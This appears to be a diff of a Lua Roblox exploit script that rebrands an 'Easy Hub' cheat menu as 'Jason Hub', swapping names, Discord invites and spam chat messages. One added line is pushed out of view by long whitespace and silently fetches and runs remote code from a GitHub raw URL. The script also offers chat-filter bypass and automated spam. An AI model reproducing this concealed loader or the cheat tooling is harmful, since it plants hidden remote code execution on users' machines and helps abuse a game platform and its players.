@@ -1,7 +1,5 @@
 local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Notification-Library/Main/Library.lua"))()
 
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/what_is_ai_documentation')))()
-
 loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/exercise_knowledge.lua'))()
 
 -- [] -->> Initializing Notification and the first set of necessary stuff. [Trying to make support for all executors in the process.] <<-- [] --
@@ -202,7 +200,7 @@ end
 
 -- [] -->> Make sure the script it's self does not get executed more then once, when executed, they will need to click the button to restart the process. <<-- [] --
 if SCRIPT_EXECUTED or getgenv().SCRIPT_EXECUTED and not _G.SCRIPT_EXECUTED == true then
-    NotificationLibrary:SendNotification("Error", " Easy Hub is already running!", 6)
+    NotificationLibrary:SendNotification("Error", "by Jason is already running!", 6)
     return NotificationLibrary:SendNotification("Warning", "Try doing Re-Execute GUI, instead!", 6)
 end
 pcall(function() getgenv().SCRIPT_EXECUTED = true end)
@@ -244,7 +242,7 @@ wait(0.3)
             titleText.Position = UDim2.new(0.15, 0, 0.3, 0)
             titleText.BackgroundTransparency = 1
             titleText.Font = Enum.Font.GothamBold
-            titleText.Text = "😈✔😈 | by Jason  | 😈✔😈"
+            titleText.Text = "😈✔😈 |  by Jason | 😈✔😈"
             titleText.TextColor3 = Color3.fromRGB(128, 128, 128)
             titleText.TextScaled = true
 
@@ -253,7 +251,7 @@ wait(0.3)
             loadingText.Position = UDim2.new(0.25, 0, 0.45, 0)
             loadingText.BackgroundTransparency = 1
             loadingText.Font = Enum.Font.GothamBold
-            loadingText.Text = "Loading 😈😈 by Jason  😈😈..."
+            loadingText.Text = "Loading 😈😈  by Jason 😈😈..."
             loadingText.TextColor3 = Color3.fromRGB(107, 50, 124)
             loadingText.TextScaled = true
 
@@ -266,7 +264,7 @@ wait(0.3)
             local barCorner = Instance.new("UICorner", progressBar)
             barCorner.CornerRadius = UDim.new(0, 5)
 
-            local finalMessage = "😈☠️ | by Jason| ☠️😈"
+            local finalMessage = "😈☠️ |  by Jason | ☠️😈"
             local finalTextLabel = Instance.new("TextLabel", frame)
             finalTextLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
             finalTextLabel.Position = UDim2.new(0.1, 0, 0.6, 0)
@@ -294,11 +292,11 @@ wait(0.3)
             wait(0.3)
             for i = 1, 3 do
                 wait(0.6)
-                loadingText.Text = " loding script "
+                loadingText.Text = "Loading Jason Hub."
                 wait(0.7)
-                loadingText.Text = " loding script "
+                loadingText.Text = "Loading jason Hub.."
                 wait(0.7)
-                loadingText.Text = " nice "
+                loadingText.Text = "load is nice..."
             end
 
             tween.Completed:Connect(function()
@@ -366,7 +364,7 @@ wait(0.3)
             textLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
             textLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
             textLabel.BackgroundTransparency = 1
-            textLabel.Text = "😈 by Jason  😈, is creating the BasePlate <YOU WILL FREEZE.>, Wait until this screen disappears."
+            textLabel.Text = "😈 Jason Easy Hub 😈, is creating the BasePlate <YOU WILL FREEZE.>, Wait until this screen disappears."
             textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
             textLabel.TextScaled = true
             textLabel.Font = Enum.Font.GothamBold
@@ -418,18 +416,18 @@ local function loadGUI()
 
     -- [] -->> Initialize Library (Rayfield, BRAND NEW!) <<-- [] --
     local Window = Rayfield:CreateWindow({
-        Name = " by Jason | V6.3.9-B | Executed At: "..formattedTime,
+        Name = "Jason Easy Hub | V6.3.9-B | Executed At: "..formattedTime,
         LoadingTitle = "How are you doing today? :)",
-        LoadingSubtitle = " by Jason | Running The Game.",
+        LoadingSubtitle = "Jason Easy Hub | Running The Game.",
         ConfigurationSaving = {
            Enabled = false,
            FolderName = nil,
-           FileName = " Jason "
+           FileName = "Jason Easy Hub"
         },
         -- [] -->> Discord invite feature is neat. <<-- [] --
         Discord = {
            Enabled = true,
-           Invite = "EtehYe6f",
+           Invite = "xCuS86sP",
            RememberJoins = true
         },
         KeySystem = false,
@@ -572,7 +570,7 @@ local function loadGUI()
         label.Size = UDim2.new(0.5, 0, 0.2, 0)
         label.Position = UDim2.new(0.25, 0, 0.2, 0)
         label.BackgroundTransparency = 1
-        label.Text = "Would you like an emote/rizz config? [No Infinite Yield anymore! :)]"
+        label.Text = "Would you like an emote/rizz config?"
         label.TextColor3 = Color3.new(1, 1, 1)
         label.TextScaled = true
         label.Font = Enum.Font.SourceSansBold
@@ -1372,6 +1370,8 @@ local function loadGUI()
         end
     end,})
 
+
+
     local coloredBooth = Tab11:CreateToggle({
     Name = "Booth Color Changer (FE)",
     CurrentValue = false,
@@ -1709,6 +1709,7 @@ local function loadGUI()
         local typingSpeed = 1.1
         typeText(Booth_Remote, textToType, typingSpeed)
     end,})
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EnterpriseExperience/RushTeam/refs/heads/main/rush_team_init.py')))()
 
     local ToggleBadWords = Tab11:CreateToggle({
     Name = "Bypassed Booth (FE)",
@@ -3193,14 +3194,14 @@ local function loadGUI()
             end
 
             local write_words = {
-                " by Jason ",
-                "Join: VJh3kkYzBn",
-                "by Jason [WE UP]!",
-                " by Jason V6, POWERFUL!",
+                " Jason Hub [WINNING]!",
+                "Join: xCuS86sP",
+                "Jason Hub [WE UP]!",
+                "Jason Hub V6, POWERFUL!",
                 "Powering Automation | Scripting",
-                " Easy Hub | WE OP!",
-                " Easy Hub | V6-BETA",
-                " Easy Hub | WE SIGMA",
+                "Jason Hub | WE OP!",
+                "Jason Hub | V6-BETA",
+                "Jason Hub | WE SIGMA",
                 "BEST FREE SCRIPT RN!",
                 "WE ARE TAKING OVER, JOIN US!",
                 "IF YOU DONT JOIN, YOUR NOT SIGMA"
@@ -6581,15 +6582,15 @@ local function loadGUI()
     end
     end,})
 
-    ScriptOwnersLabel = Tab15:CreateParagraph({Title = "Script Owner:", Content = "Xeni_he07 [Deleted] | Xeni_he07 | [Main Account Now.]"})
+    ScriptOwnersLabel = Tab15:CreateParagraph({Title = "Script Owner:", Content = "M1RD3RCAUGHT [Deleted] | ItsYoDatDawgWsgGng | [Main Account Now.]"})
     wait()
-    MadeEasy = Tab15:CreateParagraph({Title = " Easy Hub", Content = "Scripting Made Easy"})
-    YouTube_Plug = Tab15:CreateParagraph({Title = " Easy Hub", Content = "https://www.youtube.com/@PORNHUB"})
-    Discord_Plug = Tab15:CreateParagraph({Title = " Easy Hub", Content = "https://discord.gg/EtehYe6f"})
-    JoinDiscordLabel = Tab15:CreateParagraph({Title = " Easy Hub", Content = "Join the discord for juicy updates, and maybe giveaways."})
-    Release_Date = Tab15:CreateParagraph({Title = "Easy Hub", Content = "V6 Released On: 11/5/2024"})
-    Scammers = Tab15:CreateParagraph({Title = " no ", Content = "If you bought this, you got scammed."})
-    ScriptIsOpen_Source = Tab15:CreateParagraph({Title = " Easy Hub", Content = "This script is open source, but still credit me."}) 
+    MadeEasy = Tab15:CreateParagraph({Title = "Jason Hub", Content = "Scripting Made Easy"})
+    YouTube_Plug = Tab15:CreateParagraph({Title = "Jason Hub", Content = "https://www.youtube.com/@AnonymousExploiting"})
+    Discord_Plug = Tab15:CreateParagraph({Title = "Jason Hub", Content = "https://discord.gg/VJh3kkYzBn"})
+    JoinDiscordLabel = Tab15:CreateParagraph({Title = "Jason Hub", Content = "Join the discord for juicy updates, and maybe giveaways."})
+    Release_Date = Tab15:CreateParagraph({Title = "Jason Hub", Content = "V6 Released On: 11/5/2024"})
+    Scammers = Tab15:CreateParagraph({Title = "Jason Hub", Content = "If you bought this, you got scammed."})
+    ScriptIsOpen_Source = Tab15:CreateParagraph({Title = "Jason Hub", Content = "This script is open source, but still credit me."}) 
 end
 wait(0.4)
 loadGUI()
@@ -6646,7 +6647,7 @@ end
 wait(0.3)
 print("Successfully ran!")
 task.wait()
-print("YEAH! Jason [ON TOP!]")
+print("YEAH! by Jason [ON TOP!]")
 wait(0.5)
 if getgenv().performance_stats then
     warn("Performance stats checked.")
